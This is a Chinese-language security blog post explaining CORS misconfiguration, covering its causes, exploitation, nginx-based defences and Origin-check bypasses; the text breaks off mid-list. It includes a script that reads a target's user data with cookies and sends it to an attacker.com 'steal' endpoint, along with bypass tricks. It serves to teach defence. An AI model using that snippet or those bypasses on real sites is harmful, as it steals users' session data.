em"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CORS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-20T14:55:32.000Z" title="发表于 2025-02-20 22:55:32">2025-02-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-23T03:52:19.811Z" title="更新于 2025-04-23 11:52:19">2025-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p><strong>原理：</strong><br>允许浏览器向**不同源（协议+域名+端口）**的服务器发起跨域请求的机制。其核心目的是解决浏览器的同源策略（SOP）限制，但配置不当会导致恶意网站窃取用户数据或发起未授权操作。</p>
<p><strong>漏洞成因：</strong></p>
<ul>
<li>宽松的CORS策略：服务器错误配置响应头（<code>Access-Control-Allow-Origin：*</code>），允许任意域访问资源</li>
<li>动态信任Origin：服务器未严格校验Origin头，直接反射回<code>Access-Control-Allow-Origin</code>头</li>
<li>携带铭感凭证：结合<code>Access-Control-Allow-Credentials: true</code>，允许跨域请求携带Cookie等凭证，导致会话劫持。</li>
</ul>
<p><strong>关键流程：</strong></p>
<ul>
<li>浏览器发起跨域请求时，自动添加Origin头（如Origin：<code>https://attacker.com</code>）</li>
<li>服务器返回响应头，指定允许的源、方法、头部等（如<code>Access-Control-Allow-Origin: https://attacker.com</code>）</li>
<li>浏览器根据响应头决定是否允许前端<code>JavaScript</code>读取响应内容</li>
</ul>
<h1 id="CORS利用"><a href="#CORS利用" class="headerlink" title="CORS利用"></a>CORS利用</h1><p><strong>攻击场景：</strong></p>
<ul>
<li><p>窃取用户数据：构造恶意页面，诱导用户访问，通过跨域请求读取目标网站敏感信息（如用户信息、API响应）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(<span class="string">&#x27;https://target.com/api/userData&#x27;</span>, &#123; </span></span><br><span class="line"><span class="language-javascript">    <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> <span class="comment">// 携带Cookie</span></span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123; </span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/steal?data=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(data)); </span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>篡改用户操作：结合CSRF漏洞，利用CORS的宽松策略发起POST&#x2F;PUT请求（如修改密码、转账）</p>
</li>
</ul>
<p><strong>经典案例：</strong></p>
<ul>
<li>Origin反射型CORS：若服务器返回<code>Access-Control-Allow-Origin: [请求的Origin]</code>且允许凭证，攻击者可构造恶意Origin获取数据。</li>
<li>子域名滥用：若主域允许<code>*.example.com</code>,攻击者注册<code>eval.example.com</code>,利用子域名发起跨域请求。</li>
</ul>
<h1 id="CORS防御"><a href="#CORS防御" class="headerlink" title="CORS防御"></a>CORS防御</h1><p><strong>严格校验Origin：</strong></p>
<ul>
<li><p>白名单模式：仅允许受信任的源，禁止使用通配符（<code>*</code>）</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Origin https://trusted-site.com;</span><br></pre></td></tr></table></figure>
</li>
<li><p>动态校验Origin：检查<code>Origin</code>头是否在预定义白名单中，避免直接反射</p>
</li>
</ul>
<p><strong>限制凭据与敏感头：</strong></p>
<ul>
<li><p>避免全局允许凭证：仅在必要时设置<code>Access-Control-Allow-Credentials：true</code>，并确保同时限制<code>Access-Control-Allow-Origin</code>为具体域名。</p>
</li>
<li><p>屏蔽敏感头：禁止暴露Cookie、Authorization等头（通过<code>Access-Control-Expose-Headers</code>控制）</p>
</li>
</ul>
<p><strong>精细化控制方法与头：</strong></p>
<ul>
<li><p>明确允许的HTTP方法：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">&#x27;GET, POST, OPTIONS&#x27;</span>;  </span><br></pre></td></tr></table></figure>
</li>
<li><p>限制自定义头：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Headers <span class="string">&#x27;Content-Type, X-Requested-With&#x27;</span>;  </span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>预检测请求缓存：</strong></p>
<ul>
<li>设置<code>Access-Control-Max-Age</code>减少OPTIONS预检请求次数，但需权衡安全性。</li>
</ul>
<p><strong>补充防御措施：</strong></p>
<ul>
<li>同源检测：关键操作（如修改密码）需验证请求来源是否同源</li>
<li>结合CSRF Token：即使CORS配置错误，<code>CORS TOken</code>仍可阻止未授权操作。</li>
</ul>
<h1 id="CORS绕过"><a href="#CORS绕过" class="headerlink" title="CORS绕过"></a>CORS绕过</h1><p><strong>Origin校验逻辑缺陷：</strong></p>
<ul>
<li>前缀&#x2F;后缀匹配绕过：若白名单校验不严格（如<code>example.com.evil.com</code>），攻击者可注册相似域名。</li>
<li>Null Origin利用：某些场景（如本地文件<code>file://</code>协议）下，<code>Origin</code>头为<code>null</code>，需确保服务器拒绝<code>null</code></li>
</ul>
<p><strong>反射型CORS滥用：</strong></p>
<ul>
<li>构造恶意Origin：若服务器直接反射<code>Access-Control-Allow-Origin</code>，攻击者诱导用户从任意域发起请求。</li>
</ul>
<p><strong>信任第三方服务：</strong></p>
<ul>
<li>利用可信CDN或云服务：若目标网站信任<code>*.cloudfront.net</code>,攻击者可注册云服务子域名发起请求。</li>
</ul>
<p><strong>协议降级与端口忽略：</strong></p>
<ul>
<li>HTTP-&gt;HTTPS绕过：若服务器未校验协议，攻击者通过HTTP页面发起HTTPS请求</li>
<li>端口差异忽略：若服务器不校验端口（如<code>example.com:8080</code> vs <code>example.com</code>），可能绕过白名单</li>
</ul>
<p><strong>结合XSS漏洞：</strong></p>
<ul>
<li>同源<code>XSS+CORS</code>：若网站存在XSS漏洞，可绕过<code>CORS</code>限制直接读取数据，无需依赖跨域策略</li>
